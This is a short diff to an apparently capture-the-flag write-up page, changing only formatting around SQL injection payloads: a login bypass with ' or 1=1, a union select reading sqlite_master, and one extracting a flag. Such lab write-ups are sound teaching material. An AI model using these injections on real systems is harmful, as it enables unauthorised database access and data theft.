@@ -43,7 +43,8 @@
                 operator to ignore the rest of the query.
             <pre>
                     <code>
---PAYLOAD:
+PAYLOAD:
+
 username: (anything)
 password: ' or 1=1;
 
@@ -60,7 +61,8 @@ SELECT id FROM users WHERE password = '' OR 1=1;' AND username = 'admin'
             for the database.
             <pre>
                 <code>
---PAYLOAD:
+PAYLOAD:
+
 ' union select sql, 1, 1 sqlite_master;
                 </code>
             </pre>
@@ -76,7 +78,8 @@ SELECT id FROM users WHERE password = '' OR 1=1;' AND username = 'admin'
             table. Again, we can query this table using the payload below, giving us our flag.
             <pre>
                 <code>
---PAYLOAD:
+PAYLOAD:
+
 ' union select flag, 1, 1 from more_table;
                 </code>
             </pre>
